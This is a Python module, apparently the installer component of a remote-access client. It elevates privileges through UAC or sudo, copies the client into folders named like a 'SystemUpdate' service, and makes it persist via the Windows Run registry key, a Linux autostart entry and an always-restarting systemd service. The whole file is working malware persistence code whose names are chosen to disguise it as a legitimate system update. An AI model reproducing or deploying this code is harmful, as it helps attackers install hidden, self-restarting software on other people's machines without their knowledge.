import ctypes
import os
import sys
import shutil
import platform
import subprocess
if sys.platform == 'win32':
    import winreg
import getpass
import stat


class ClientSetup:
    def __init__(self, client_script_path, persistence_name="system_update_service"):
        """
        Constructor de la clase ClientSetup
        :param client_script_path: Ruta del script del cliente
        :param persistence_name: Nombre de la persistencia
        """
        self.client_script_path = os.path.abspath(client_script_path)
        self.persistence_name = persistence_name
        self.os_type = platform.system().lower()

        # Default installation paths
        self.installation_paths = {
            'windows': os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate'),
            'linux': '/opt/system_updates',
            'darwin': '/Library/Application Support/SystemUpdate'
        }

    def _require_admin(self):
        """
        Comprueba si se necesita administrador para la operación actual
        """
        if self.os_type == 'windows':
            import ctypes
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0

    def _elevate_privileges(self):
        """
        Intento de elevar privilegios de administrador
        """
        if not self._require_admin():
            if self.os_type == 'windows':
                # Windows UAC elevation
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit(0)
            elif self.os_type in ['linux', 'darwin']:
                # Sudo for Unix-like systems
                os.execvp('sudo', ['sudo'] + sys.argv)

    def install(self, install_path=None, create_autostart=True, create_service=True):
        """
        Instala el cliente en el sistema y configura la persistencia si es necesario
        """
        if not self._require_admin():
            self._elevate_privileges()

        # Determine installation path
        if not install_path:
            install_path = self.installation_paths.get(self.os_type, '/opt/system_update')

        # Create installation directory
        os.makedirs(install_path, exist_ok=True)

        # Copy client script to installation path
        target_script = os.path.join(install_path, os.path.basename(self.client_script_path))
        shutil.copy2(self.client_script_path, target_script)

        # Set executable permissions
        os.chmod(target_script, os.stat(target_script).st_mode | stat.S_IEXEC)

        # Persistence mechanisms
        if create_autostart:
            self._create_autostart(target_script)

        if create_service:
            self._create_system_service(target_script)

        return {
            'status': 'success',
            'path': target_script
        }

    def _create_autostart(self, script_path):
        """Create autostart entry based on OS"""
        if self.os_type == 'windows':
            # Windows autostart via registry
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(key, self.persistence_name, 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
            except Exception as e:
                print(f"Autostart creation failed: {e}")

        elif self.os_type == 'linux':
            # Linux autostart via .desktop file
            autostart_dir = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, f'{self.persistence_name}.desktop')

            desktop_content = f"""[Desktop Entry]
Type=Application
Name={self.persistence_name}
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true"""

            with open(desktop_file, 'w') as f:
                f.write(desktop_content)

    def _create_system_service(self, script_path):
        """Create system service based on OS"""
        if self.os_type == 'linux':
            service_file = f'/etc/systemd/system/{self.persistence_name}.service'
            service_content = f"""[Unit]
Description={self.persistence_name} System Update Service
After=network.target

[Service]
ExecStart={script_path}
Restart=always
User={getpass.getuser()}

[Install]
WantedBy=multi-user.target"""

            with open(service_file, 'w') as f:
                f.write(service_content)

            # Enable and start service
            subprocess.run(['systemctl', 'enable', f'{self.persistence_name}.service'], check=True)
            subprocess.run(['systemctl', 'start', f'{self.persistence_name}.service'], check=True)

    def uninstall(self, remove_config=True):
        """
        Uninstall the client and remove configurations

        :param remove_config: Remove all configuration and logs
        :return: Uninstallation status
        """
        if not self._require_admin():
            self._elevate_privileges()

        installation_path = self.installation_paths.get(self.os_type)

        # Remove installed script
        if installation_path and os.path.exists(installation_path):
            shutil.rmtree(installation_path)

        # Remove autostart entries and services
        if self.os_type == 'windows':
            try:
                key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, self.persistence_name)
                winreg.CloseKey(key)
            except FileNotFoundError:
                pass

        elif self.os_type == 'linux':
            # Remove autostart desktop file
            autostart_file = os.path.join(os.path.expanduser('~'), '.config', 'autostart',
                                          f'{self.persistence_name}.desktop')
            if os.path.exists(autostart_file):
                os.remove(autostart_file)

            # Remove systemd service
            subprocess.run(['systemctl', 'stop', f'{self.persistence_name}.service'], check=False)
            subprocess.run(['systemctl', 'disable', f'{self.persistence_name}.service'], check=False)
            service_file = f'/etc/systemd/system/{self.persistence_name}.service'
            if os.path.exists(service_file):
                os.remove(service_file)

        return {
            'status': 'success',
            'message': 'Client successfully uninstalled'
        }

    def detect_existing_installation(self):
        """
        Check if the client is already installed

        :return: Dictionary with installation details or None
        """
        installation_path = self.installation_paths.get(self.os_type)

        if installation_path and os.path.exists(installation_path):
            script_path = os.path.join(installation_path, os.path.basename(self.client_script_path))

            return {
                'installed': True,
                'path': script_path,
                'installed_at': os.path.getctime(script_path)
            }

        return {'installed': False}


# Usage Example
if __name__ == "__main__":
    client_setup = ClientSetup(__file__)

    # Install with default options
    install_result = client_setup.install()

    # Check installation
    installation_status = client_setup.detect_existing_installation()

    # Uninstall if needed
    # uninstall_result = client_setup.uninstall()